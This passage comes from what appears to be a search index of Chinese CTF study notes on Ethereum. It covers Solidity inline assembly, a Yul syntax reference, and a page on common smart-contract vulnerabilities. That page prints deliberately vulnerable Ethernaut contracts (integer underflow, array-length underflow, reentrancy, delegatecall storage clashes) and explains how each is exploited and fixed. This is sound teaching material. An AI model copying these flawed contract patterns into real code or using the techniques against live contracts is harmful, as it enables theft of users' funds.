<li>\u53ef\u4ee5\u662f\u4e00\u4e2a\u5e93\u7684\u540d\u5b57\uff0c\u5373\u5c06\u5e93\u4e2d\u7684\u6240\u6709\u51fd\u6570\u90fd\u9644\u52a0\u5728\u7c7b\u578b\u4e0a\uff1ausing L for uint;</li> </ul> </li> <li>\u5bf9\u4e8e B \u90e8\u5206\uff1a<ul> <li>\u53ef\u4ee5\u662f\u4e00\u4e2a\u6307\u5b9a\u7684\u663e\u5f0f\u7c7b\u578b\uff08\u4e0d\u9700\u8981\u6570\u636e\u4f4d\u7f6e\u6807\u8bb0\uff09</li> <li>\u5728\u5408\u7ea6\u4e2d\u53ef\u4ee5\u662f \uff0c\u7528\u6765\u5c06\u5e93\u4e2d\u7684\u51fd\u6570\u9644\u52a0\u5230\u6240\u6709\u7c7b\u578b\u4e0a\uff1ausing L for ;</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_28","title":"\u5185\u8054\u6c47\u7f16","text":"<ul> <li>solidity \u4ee3\u7801\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5185\u8054\u6c47\u7f16\uff0c\u4f1a\u7ed5\u8fc7\u5b89\u5168\u68c0\u67e5\uff0c\u8981\u5c11\u7528</li> <li>\u5185\u8054\u6c47\u7f16\u5199\u5728 <code>assembly { ... }</code> \u5757\u4e2d\uff0c\u4f7f\u7528 Yul \u8bed\u6cd5\uff0c\u89c1\uff1aYul \u8bed\u8a00</li> <li>\u5185\u8054\u6c47\u7f16\u4e2d\u53ef\u4ee5\u4f7f\u7528 solidity \u5c40\u90e8\u53d8\u91cf</li> <li>\u4e0d\u540c\u7684\u6c47\u7f16\u5757\u6709\u4e0d\u540c\u547d\u540d\u7a7a\u95f4\uff0c\u4e0d\u80fd\u4e92\u76f8\u8bbf\u95ee</li> <li>\u53ef\u4ee5\u901a\u8fc7 a.slot \u8bbf\u95ee\u72b6\u6001\u53d8\u91cf a \u6240\u5728\u7684\u63d2\u69fd</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_29","title":"\u7f16\u8bd1","text":"<p>\u76f4\u63a5\u5728 Remix \u91cc\u7f16\u8bd1\u662f\u6700\u65b9\u4fbf\u7684\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u7248\u672c\u7684\u7f16\u8bd1\u5668\u3002</p> <p>\u672c\u5730\u7f16\u8bd1\u6211\u4e5f\u6ca1\u8bd5\u8fc7\uff08x</p>"},{"location":"ctf/blockchain/eth/vuln/","title":"\u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5","text":"<p> \u7ea6 1541 \u4e2a\u5b57  99 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u4e00\u4e9b\u7ecf\u5178\u3001\u5e38\u89c1\u7684\u667a\u80fd\u5408\u7ea6\u6f0f\u6d1e\u548c\u653b\u51fb\u624b\u6bb5</p>"},{"location":"ctf/blockchain/eth/vuln/#_2","title":"\u6574\u578b\u6ea2\u51fa","text":"<p>uint \u662f Solidity \u4e2d\u5f88\u5e38\u7528\u7684\u7c7b\u578b\uff0c\u4f46\u5b83\u662f\u65e0\u7b26\u53f7\u6574\u578b\uff0c\u800c\u4e14 solidity 0.8 \u4e4b\u524d\u6ca1\u6709\u6ea2\u51fa\u7684\u68c0\u67e5\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u9020\u6210\u6ea2\u51fa\u3002</p> <p>\u4f8b\u5982\uff1aEthernaut &gt; Token\uff0c\u9898\u76ee\u4e2d\u7684 balances \u8bb0\u5f55\u662f mapping(address =&gt; uint)\uff0c\u800c\u4e14\u5728 transfer \u51fd\u6570\u4e2d\u6ca1\u6709\u6ca1\u6709\u68c0\u67e5\u6ea2\u51fa\uff1a <pre><code>contract Token {\n    mapping(address =&gt; uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        require(balances[msg.sender] - _value &gt;= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n</code></pre> \u8fd9\u5c31\u5bfc\u81f4\u4e86\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 transfer \u6bd4\u4f59\u989d\u66f4\u591a\u7684 value\uff0c\u8ba9\u8bb0\u5f55\u7684 balance \u53d8\u6210\u6b63\u7684\u6781\u5927\u503c\u3002</p> <p>\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\u662f\u5224\u65ad\u6ea2\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528 OpenZeppelin \u7684 SafeMath \u5e93\uff1a <pre><code>import \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract Token {\n    using SafeMath for uint256;\n    ...\n}\n</code></pre> \u5176\u63d0\u4f9b\u4e86\u4e00\u4e9b\u65b9\u6cd5\u7528\u6765\u8fdb\u884c\u5e26\u6ea2\u51fa\u68c0\u67e5\u7684\u8fd0\u7b97\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_3","title":"\u53d8\u957f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u4efb\u610f\u5199","text":"<p>\u6574\u578b\u6ea2\u51fa\u5e26\u6765\u7684\u4e00\u4e2a\u66f4\u4e25\u91cd\u7684\u95ee\u9898\u662f\u5982\u679c\u5141\u8bb8\u7528\u6237\u64cd\u4f5c\u53d8\u957f\u6570\u7ec4\u957f\u5ea6\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\uff0c\u4ece\u800c\u53ef\u4ee5\u8bfb\u5199\u5168\u90e8\u7684 storage\u3002</p> <p>\u4f8b\u5982\uff1aEthernaut &gt; Alien Codex\uff0c\u9898\u76ee\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u65b9\u6cd5\u6765\u51cf\u5c0f\u6570\u7ec4\u957f\u5ea6\uff0c\u540c\u65f6\u5b58\u5728\u5199\u5165\u6570\u7ec4\u7684\u51fd\u6570\uff1a <pre><code>contract AlienCodex is Ownable {\n\n    bool public contact;\n    bytes32[] public codex;\n\n    modifier contacted() {\n        assert(contact);\n        _;\n    }\n\n    function make_contact() public {\n        contact = true;\n    }\n\n    function record(bytes32 _content) contacted public {\n        codex.push(_content);\n    }\n\n    function retract() contacted public {\n        codex.length--;\n    }\n\n    function revise(uint i, bytes32 _content) contacted public {\n        codex[i] = _content;\n    }\n}\n</code></pre> \u6570\u7ec4\u7684\u957f\u5ea6\u662f\u5b58\u5728\u5f53\u524d slot \u4e2d\u7684\uff0c\u662f\u4e00\u4e2a uint256\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece 0 \u51cf\u5c0f\u5230\u5230 2**256-1\uff0c\u800c\u4e14\u6570\u7ec4\u7684\u771f\u6b63\u5b58\u50a8\u4f4d\u7f6e\u662f keccak256(slot) \u5f00\u5934\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u6765\u627e\u5230\u5e76\u8bfb\u5199\u4efb\u610f slot\uff08\u8ba1\u7b97 slot \u4e5f\u4f1a\u7528\u5230\u6ea2\u51fa\uff09\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_4","title":"\u91cd\u5165\u653b\u51fb","text":"<p>\u91cd\u5165\u653b\u51fb\uff08Re-entrancy\uff09\u662f\u4e00\u4e2a\u5f88\u7ecf\u5178\u7684\u533a\u5757\u94fe\u667a\u80fd\u5408\u7ea6\u653b\u51fb\u65b9\u5f0f\u3002</p> <p>\u4f8b\u5982\u5982\u4e0b\u5408\u7ea6\uff1a <pre><code>contract Bank {\n    mapping(address =&gt; uint256) balances;\n    ...\n    function withdraw(uint256 amount) public {\n        require(balances[msg.sender] &gt;= amount);\n        msg.sender.call.value(amount)(\"\");\n        balances[msg.sender] -= amount;\n    }\n}\n</code></pre> \u8fd9\u4e2a\u5408\u7ea6\u6700\u5927\u7684\u95ee\u9898\u5728\u4e8e\u5b83\u5148\u8f6c\u4e86\u94b1\uff0c\u7136\u540e\u624d\u66f4\u65b0\u7684 balances\u3002\u867d\u7136\u8f6c\u8d26\u4e0d\u6210\u529f\u7684\u8bdd revert \u4f1a\u56de\u6eda\u6240\u6709\u72b6\u6001\uff0c\u4f46\u662f\u5b83\u5728\u8f6c\u8d26\u7684\u65f6\u5019\u5c31\u4f1a\u89e6\u53d1\u5230\u63a5\u6536\u5408\u7ea6\u7684 fallback \u51fd\u6570\u3002\u90a3\u4e48\u5982\u679c\u5728 fallback \u51fd\u6570\u4e2d\u7ee7\u7eed\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u90a3\u4e48\u8fd9\u6b21\u68c0\u67e5 require \u7684\u65f6\u5019\u7684 balances \u4ecd\u662f\u4e4b\u524d\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u6210\u529f\u901a\u8fc7\u68c0\u67e5\uff0c\u7ee7\u7eed\u4e0b\u4e00\u6761\u4e5f\u5c31\u662f\u8f6c\u8d26\uff0c\u800c\u5728\u6700\u540e\u8fd4\u56de\u7684\u65f6\u5019\u624d\u4f1a\u4e00\u6b21\u6b21\u5730\u51cf\u5c11 balances\uff08\u4e5f\u4f1a\u4e0b\u6ea2\uff09\u3002\u8fd9\u65f6\u5df2\u7ecf\u4e0d\u7528\u5728\u610f\uff0c\u56e0\u4e3a\u94b1\u5df2\u7ecf\u4e00\u8f6e\u4e00\u8f6e\u5730\u88ab\u8f6c\u8d70\u4e86\u3002</p> <p>\u6240\u4ee5\u5982\u679c\u5408\u7ea6\u4e2d\u6709\u7c7b\u4f3c\u7684\u64cd\u4f5c\u7684\u8bdd\uff0c\u4e00\u5b9a\u8981\u5148\u8bb0\u8d26\u518d\u8f6c\u94b1\u3002\u6216\u8005\u53ef\u4ee5\u4f7f\u7528 OpenZeppelin \u7684 ReentrancyGuard\uff0c\u91cc\u9762\u63d0\u4f9b\u4e86\u4e00\u4e2a modifier nonReentrant \u53ef\u4ee5\u9632\u6b62\u91cd\u5165\u3002</p> <p>\u4f8b\u9898\u662f\uff1aEthernaut &gt; Re-entrancy\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_5","title":"\u4f2a\u968f\u673a\u6570","text":"<p>\u7531\u4e8e\u533a\u5757\u94fe\u7684\u7279\u6027\uff0c\u9700\u8981\u6240\u6709\u4ee5\u592a\u574a\u8282\u70b9\u9a8c\u8bc1\u4ea4\u6613\u8ba1\u7b97\u51fa\u76f8\u540c\u7ed3\u679c\u8fbe\u6210\u5171\u8bc6\uff0c\u6240\u4ee5\u667a\u80fd\u5408\u7ea6\u4e2d\u5e76\u4e0d\u80fd\u5b9e\u73b0\u771f\u968f\u673a\u6570\uff0c\u800c\u4f2a\u968f\u673a\u4e5f\u6709\u5f88\u591a\u79cd\u53ef\u80fd\u6765\u7834\u89e3\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_6","title":"\u4f7f\u7528\u533a\u5757\u53d8\u91cf\u4f5c\u4e3a\u968f\u673a\u6570","text":"<p>\u6bd4\u5982\u5728\u9a8c\u8bc1\u7684\u65f6\u5019\u7528\u5230\u4e86\u5f53\u524d\u533a\u5757\u7684\u4fe1\u606f\uff0c\u5982 coinbase\u3001timestamp\u3001number \u7b49\u3002\u800c\u5728\u6211\u4eec\u8fdb\u884c\u4ea4\u6613\u65f6\uff0c\u662f\u5904\u5728\u540c\u4e00\u4e2a\u533a\u5757\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u540c\u65f6\u8ba1\u7b97\u51fa\u76f8\u540c\u7684\u968f\u673a\u6570\u503c\u3002</p> <p>\u4f8b\u9898\uff1aEthernaut &gt; Coin Flip\u3001Security Innovation &gt; Lottery\u3001Security Innovation &gt; Heads or Tails\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#blockhash","title":"\u4f7f\u7528 blockhash \u4f5c\u4e3a\u968f\u673a\u6570","text":"<p>\u524d\u9762\u7684\u51e0\u9053\u4f8b\u9898\u4e2d\u4e5f\u6709\u4f7f\u7528 blockhash \u7684\u60c5\u51b5\uff0c\u4e0d\u8fc7\u90fd\u662f\u8ba1\u7b97\u7684\u5f53\u524d\u533a\u5757\u7684 hash\u3002\u800c\u8fd9\u91cc\u8981\u8bf4\u7684\u662f\u53e6\u4e00\u79cd\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u8bb0\u5f55\u4e86\u67d0\u4e00\u65f6\u523b\u7684 block number\uff0c\u7136\u540e\u5728\u4e4b\u540e\u4f7f\u7528 blockhash \u8ba1\u7b97 hash\u3002</p> <p>\u8fd9\u79cd\u60c5\u51b5\u7684\u95ee\u9898\u662f\uff0cblockhash \u51fd\u6570\u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1 256 \u4e2a\u5757\u7684 hash\uff0c\u66f4\u65e9\u7684\u533a\u5757\u8ba1\u7b97 blockhash \u5f97\u5230\u7684\u90fd\u662f 0\u3002</p> <p>\u4f8b\u9898\uff1aSecurity Innovation &gt; Raffle\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_7","title":"\u56de\u6eda\u653b\u51fb","text":"<p>\u6bd4\u5982\u9884\u6d4b\u548c\u652f\u4ed8\u5728\u540c\u4e00\u6b21\u4ea4\u6613\u91cc\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u7ed9\u51fa\u4e00\u4e2a\u9884\u6d4b\uff0c\u5bf9\u65b9\u5c31\u4f1a\u901a\u8fc7\u4ea4\u6613\u7684\u91d1\u989d\u6765\u7ed9\u6211\u53cd\u9988\u6b63\u786e\u4e0e\u5426\u3002\u8fd9\u6837\u7684\u8bdd\u5408\u7ea6\u8f6c\u6765\u7684\u91d1\u989d\u80af\u5b9a\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u90a3\u4e48\u5728\u63a5\u6536\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u5728 fallback \u51fd\u6570\u4e2d\u5224\u65ad\u4e00\u4e0b\u63a5\u6536\u5230\u7684\u91d1\u989d\uff0c\u5982\u679c\u4e0d\u662f\u6b63\u786e\u7684\u91d1\u989d\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5 revert \u6765\u56de\u6eda\u6574\u6761\u4ea4\u6613\uff0c\u7136\u540e\u7ee7\u7eed\u731c\u6d4b\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_8","title":"\u8585\u7f8a\u6bdb\u653b\u51fb","text":"<p>\u6bd4\u5982\u4e00\u4e2a Token \u5408\u7ea6\uff0c\u5b9e\u73b0\u4e86\u7a7a\u6295\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u53d1\u653e\u4e00\u5b9a\u6570\u91cf\u7684\u521d\u59cb token \u7ed9\u7528\u6237\uff0c\u4f46\u662f\u9650\u5236\u4e86\u6bcf\u4e2a\u7528\u6237\u53ea\u80fd\u9886\u53d6\u4e00\u6b21\uff1a <pre><code>contract Token is BasicToken {\n    mapping (address =&gt; bool) airdroped;\n    ...\n    function airdrop() public {\n        require(!airdroped[msg.sender]);\n        airdroped[msg.sender] = true;\n        balances[msg.sender] += 100;\n    }\n    ...\n}\n</code></pre> \u90a3\u4e48\u5373\u4f7f\u5b83\u9650\u5236\u4e86\u4e00\u4e2a\u7528\u6237\u9886\u4e00\u6b21\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u4e0d\u65ad\u5730\u521b\u5efa\u65b0\u7684\u5408\u7ea6\u6765\u9886\u53d6\u7a7a\u6295\uff0c\u56e0\u4e3a\u6bcf\u4e00\u4e2a\u65b0\u5408\u7ea6\u90fd\u662f\u4e00\u4e2a\u65b0\u5408\u7ea6\uff0c\u7136\u540e\u518d\u4ece\u5408\u7ea6\u4e2d\u8f6c\u51fa\u6765\u6c47\u603b\uff0c\u62ff\u5230\u5de8\u91cf token\u3002\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u8585\u7f8a\u6bdb\u653b\u51fb\u3002</p> <p>\u4f8b\u9898\uff1a\ud83d\udd12 AAA &gt; hard gambler</p>"},{"location":"ctf/blockchain/eth/vuln/#_9","title":"\u8bfb\u53d6\u79c1\u6709\u53d8\u91cf","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u5c31\u4e0d\u5fc5\u7ec6\u8bf4\u4e86\uff0csolidity \u4e2d\u7684 private \u53d8\u91cf\u53ea\u662f\u6ca1\u6709\u516c\u5f00\u67e5\u8be2\u7684\u63a5\u53e3\uff0c\u5b9e\u9645\u4e0a\u662f\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5bf9\u5e94 storage \u7684 slot \u503c\u6765\u83b7\u53d6\u7684\u3002\u76f8\u5173\u539f\u7406\uff1a\u4ee5\u592a\u574a\u57fa\u7840 &gt; \u5b58\u50a8\u3002</p> <p>\u4f8b\u9898\uff1aEthernaut &gt; Vault\u3001Ethernaut &gt; Privacy\u3001Security Innovation &gt; Lock Box\u3002</p>"},{"location":"ctf/blockchain/eth/vuln/#_10","title":"\u8fdc\u7a0b\u8c03\u7528","text":"<p>\u4e00\u4e2a\u6bd4\u8f83\u7ecf\u5178\u3001\u4e0d\u5bb9\u6613\u53d1\u73b0\u7684\u6f0f\u6d1e\uff0c\u5c31\u662f\u5408\u7ea6\u4e2d\u5927\u80c6\u5730\u4f7f\u7528\u4e86 delegatecall \u6765\u8fdb\u884c\u8de8\u5408\u7ea6\u51fd\u6570\u8c03\u7528\u3002\u4ee5\u592a\u574a\u63d0\u4f9b\u7684\u56db\u79cd\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\u7684\u533a\u522b\u5728\u4ee5\u592a\u574a\u865a\u62df\u673a &gt; ETH \u5b57\u8282\u7801 &gt; \u8fdc\u7a0b\u8c03\u7528\u6307\u4ee4\u4e2d\u4ecb\u7ecd\u8fc7\uff1a</p> <ul> <li>call\uff1a\u6267\u884c\u73af\u5883\u4e3a\u88ab\u8c03\u7528\u8005\u7684\u73af\u5883\uff0c\u4e14 msg \u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005</li> <li>callcode\uff1a\u6267\u884c\u73af\u5883\u4e3a\u8c03\u7528\u8005\u81ea\u5df1\u7684\u73af\u5883\uff0c\u4e14 msg \u4f1a\u4fee\u6539\u4e3a\u8c03\u7528\u8005\uff08\u4e00\u822c\u4e0d\u7528\uff09</li> <li>delegatecall\uff1a\u6267\u884c\u73af\u5883\u4e3a\u88ab\u8c03\u7528\u8005\u7684\u73af\u5883\uff0c\u4e14 msg \u4e0d\u4f1a\u4fee\u6539\uff08\u4e5f\u5c31\u76f8\u5f53\u4e8e\u5c06\u5176\u5b83\u5408\u7ea6\u7684\u5b57\u8282\u7801\u62ff\u5230\u81ea\u5df1\u8eab\u4e0a\u6765\u6267\u884c\uff09</li> <li>staticcall\uff1a\u4e0d\u5141\u8bb8\u4fee\u6539\u72b6\u6001\uff08\u8fd9\u91cc\u4e0d\u9700\u8981\u5173\u5fc3\uff09</li> </ul> <p>\u6240\u4ee5\u4e00\u4e2a\u5f88\u663e\u7136\u7684\u4e8b\u60c5\u5c31\u662f\u5982\u679c\u4f7f\u7528\u4e86 delegatecall \u6765\u8c03\u7528\u5916\u90e8\u7ed9\u7684\u5408\u7ea6\u5730\u5740\u4e2d\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u5b8c\u5168\u6709\u6743\u9650\u53bb\u4fee\u6539\u8fd9\u4e2a\u5408\u7ea6\u4e2d\u7684\u72b6\u6001\u3002</p> <p>\u4f8b\u9898\uff1aEthernaut &gt; Preservation\uff1a <pre><code>contract Preservation {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner; \n    uint storedTime;\n    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {\n        timeZone1Library = _timeZone1LibraryAddress; \n        timeZone2Library = _timeZone2LibraryAddress; \n        owner = msg.sender;\n    }\n\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n}\n\ncontract LibraryContract {\n    uint storedTime;  \n\n    function setTime(uint _time) public {\n        storedTime = _time;\n    }\n}\n</code></pre> \u867d\u7136\u9898\u76ee\u5728 constructor \u4e2d\u5c31\u5df2\u7ecf\u8bbe\u5b9a\u4e86 timeZoneLibrary\uff0c\u4f46\u662f\u5b83\u662f\u901a\u8fc7 delegatecall \u8c03\u7528\u7684\uff0c\u800c\u4e14\u5176\u7ed9\u51fa\u7684 LibraryContract \u4e2d slot 0 \u662f storedTime\uff0csetTime \u51fd\u6570\u4f1a\u76f4\u63a5\u4fee\u6539\u8fd9\u4e2a slot\u3002\u90a3\u4e48\u5728\u8c03\u7528 setFirstTime \u65f6 delegatecall \u4fee\u6539\u6389\u4e86 slot 0\uff0c\u4e5f\u5c31\u4fee\u6539\u6389\u4e86 timeZone1Library\u3002\u63a5\u7740\u518d setFirstTime \u5c31\u53ef\u4ee5 delegatecall \u6211\u4eec\u81ea\u5df1\u8f93\u5165\u7684\u5408\u7ea6\u5730\u5740\u6765\u4fee\u6539 slot 2 \u4e5f\u5c31\u662f owner \u4e86\u3002</p> <p>Ethernaut &gt; Puzzle Wallet \u540c\u7406\uff0c\u4e5f\u662f\u4e00\u9053\u6ca1\u6709\u6ce8\u610f delegatecall \u5bfc\u81f4 slot \u6df7\u4e71\u7684\u4f8b\u9898\u3002</p>"},{"location":"ctf/blockchain/eth/yul/","title":"Yul \u8bed\u8a00","text":"<p> \u7ea6 1025 \u4e2a\u5b57  66 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>Yul \u662f\u4e00\u95e8\u7f16\u5199\u4ee5\u592a\u574a\u865a\u62df\u673a\u7a0b\u5e8f\u7684\u4e2d\u95f4\u8bed\u8a00\u3002\u5b83\u65e8\u5728\u540c\u65f6\u63d0\u4f9b\u53ef\u8bfb\u6027\u3001\u6e05\u6670\u7684\u63a7\u5236\u6d41\u3001\u7b80\u5355\u7684\u5b57\u8282\u7801\u8f6c\u6362\u548c\u4f18\u5316\u3002\u5728\u7f16\u5199\u6709\u957f\u5ea6\u9650\u5236\u7684\u5408\u7ea6\u4ee3\u7801\u65f6\u8f83\u4e3a\u5e38\u7528\u3002</p> <p>\u5b98\u65b9\u6587\u6863\uff1adocs.soliditylang.org &gt; Yul</p>"},{"location":"ctf/blockchain/eth/yul/#_1","title":"\u8bed\u6cd5","text":"<ul> <li>\u6ce8\u91ca\u548c solidity \u540c\u6837\u4f7f\u7528 <code>//</code> \u548c <code>/* */</code></li> <li>\u6807\u8bc6\u7b26\u53ef\u4ee5\u5305\u542b <code>.</code></li> </ul>"},{"location":"ctf/blockchain/eth/yul/#_2","title":"\u5b57\u9762\u91cf","text":"<ul> <li>\u6574\u6570\u5b57\u9762\u91cf<ul> <li>\u76f4\u63a5\u4f7f\u7528\u5341\u8fdb\u5236\u6765\u8868\u793a</li> <li>\u4f7f\u7528 0x \u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a</li> <li>\u5fc5\u987b\u5c0f\u4e8e \\(2^{256}\\)\uff0c\u65e0\u7b26\u53f7\uff0c\u5927\u7aef\u5b58\u50a8</li> </ul> </li> <li>\u5b57\u7b26\u4e32<ul> <li>\u53cc\u5f15\u53f7\u5305\u88f9\uff0c\u6700\u957f 32 \u5b57\u8282</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>\\xNN</code> \u6307\u5b9a hex \u503c\uff0c\u6216\u8005 <code>\\uNNNN</code> \u6765\u6307\u5b9a\u4e00\u4e2a Unicode \u7801\u4f4d\uff08\u4f1a\u8f6c\u4e3a UTF-8 \u5b58\u50a8\uff09</li> <li>\u5b58\u50a8\u65f6\u53f3\u4fa7\u8865 0\uff08\u5373\u5de6\u5bf9\u9f50\uff09\uff0c\u5927\u7aef</li> </ul> </li> <li>\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32<ul> <li>hex \u5f00\u5934\u52a0\u5f15\u53f7\uff0c\u4f8b\u5982 hex\"616263\"</li> <li>\u5b57\u8282\u5e8f\u5217\u4e0d\u8d85\u8fc7 32 \u5b57\u8282\uff0864 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\uff09</li> <li>\u5b58\u50a8\u540c\u5b57\u7b26\u4e32</li> </ul> </li> <li>\u5e03\u5c14\u503c<ul> <li>\u5c0f\u5199 true false</li> </ul> </li> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f u256\uff0c\u901a\u8fc7\u5192\u53f7\u52a0 <code>u8</code>\u3001<code>u32</code>\u3001<code>u64</code>\u3001<code>u128</code> \u5c06\u53ef\u4ee5\u6307\u5b9a\u5176\u5b83\u5927\u5c0f<ul> <li>\u76ee\u524d\u5e76\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4e0d\u80fd\u901a\u8fc7\u7f16\u8bd1</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/yul/#_3","title":"\u53d8\u91cf","text":"<ul> <li>\u58f0\u660e<ul> <li>\u4f7f\u7528 let \u5173\u952e\u5b57\u6765\u8fdb\u884c\u58f0\u660e</li> <li>\u53d8\u91cf\u7684\u4f5c\u7528\u57df\u53ea\u5728\u5f53\u524d\u5927\u62ec\u53f7\u8303\u56f4\u5185\uff08\u58f0\u660e\u4e4b\u540e\uff09</li> <li>\u53d8\u91cf\u5b58\u50a8\u5728\u6808\u4e0a\uff0c\u4e0d\u4f1a\u76f4\u63a5\u5f71\u54cd\u5230 memory \u548c storage\uff08\u8981\u4f7f\u7528 mload mstore sload sstore \u7b49\uff09</li> <li>\u5982\u679c\u7c7b\u578b\u4e0d\u4e3a u256\uff0c\u9700\u8981\u4f7f\u7528\u5192\u53f7\u52a0\u7c7b\u578b\u540d\u6765\u6307\u5b9a\uff08\u5c1a\u672a\u5b9e\u73b0\uff09     <pre><code>{\n    let zero:u32 := 0:u32\n    let v:u256, t:u32 := f()\n}\n</code></pre></li> </ul> </li> <li>\u5f53\u53d8\u91cf\u88ab\u5f15\u7528\u65f6\uff0c\u4f1a\u590d\u5236\u4e00\u4efd\uff08\u5229\u7528 DUP \u6307\u4ee4\uff09</li> <li>\u53d8\u91cf\u8d4b\u503c<ul> <li>\u4f7f\u7528 := \u6765\u8fdb\u884c\u53d8\u91cf\u7684\u8d4b\u503c</li> <li>\u53ef\u4ee5\u540c\u65f6\u8d4b\u503c\u591a\u4e2a\u53d8\u91cf\uff0c\u5de6\u53f3\u4e24\u4fa7\u53d8\u91cf\u4e2a\u6570\u9700\u8981\u76f8\u7b49</li> <li>\u540c\u4e00\u53d8\u91cf\u4e0d\u80fd\u591a\u6b21\u51fa\u73b0\u5728 := \u5de6\u4fa7</li> <li>\u53ef\u4ee5\u91cd\u590d\u8d4b\u503c\u6765\u8986\u76d6 <pre><code>let v := 0\nv := 2\nlet t := add(v, 2)\n</code></pre></li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/yul/#_4","title":"\u63a7\u5236\u6d41\u8bed\u53e5","text":"<ul> <li>if \u8bed\u53e5     <pre><code>if &lt;condition&gt; { &lt;body&gt; }\n</code></pre><ul> <li>\u53ea\u6709 if\uff0c\u6ca1\u6709 else\uff08\u9700\u8981\u7684\u8bdd\u53ef\u4ee5\u4f7f\u7528 switch\uff09</li> </ul> </li> <li>switch \u8bed\u53e5<ul> <li>\u6bd4\u8f83\u5e38\u89c4\uff0cswitch-case-default \u7ed3\u6784 <pre><code>...\nswitch calldataload(4)\ncase 0 {\n    x := calldataload(0x24)\n}\ndefault {\n    x := calldataload(0x44)\n}\n...\n</code></pre></li> <li>\u81f3\u5c11\u6709\u4e00\u79cd\u60c5\u51b5\uff08\u5305\u62ec default\uff09</li> <li>\u6240\u6709 case \u540c\u4e00\u7c7b\u578b</li> <li>\u5982\u679c\u6240\u6709\u60c5\u51b5\u90fd\u88ab\u8986\u76d6\u4e86\uff0c\u5219\u4e0d\u5141\u8bb8\u51fa\u73b0 default</li> </ul> </li> <li>for \u5faa\u73af     <pre><code>for { &lt;init&gt; } &lt;condition&gt; { &lt;post&gt; } { &lt;body&gt; }\n</code></pre><ul> <li>\u5927\u62ec\u53f7\u4e0d\u53ef\u5c11</li> <li>\u53ef\u4ee5\u4f7f\u7528 break \u548c continue <pre><code>{\n    let x := 0\n    for { let i := 0 } lt(i, 0x100) { i := add(i, 0x20) } {\n        x := add(x, mload(i))\n    }\n}\n</code></pre></li> <li>\u53ef\u4ee5\u8fbe\u5230 while \u5faa\u73af\u7684\u6548\u679c\uff1a     <pre><code>for { } &lt;condition&gt; { } { &lt;body&gt; }\n</code></pre></li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/yul/#_5","title":"\u51fd\u6570","text":"<ul> <li>\u51fd\u6570\u5b9a\u4e49     <pre><code>function &lt;name&gt;(&lt;param1&gt;, &lt;param2&gt;, ...) -&gt; &lt;return1&gt;, &lt;return2&gt;, ... { &lt;body&gt; }\n</code></pre><ul> 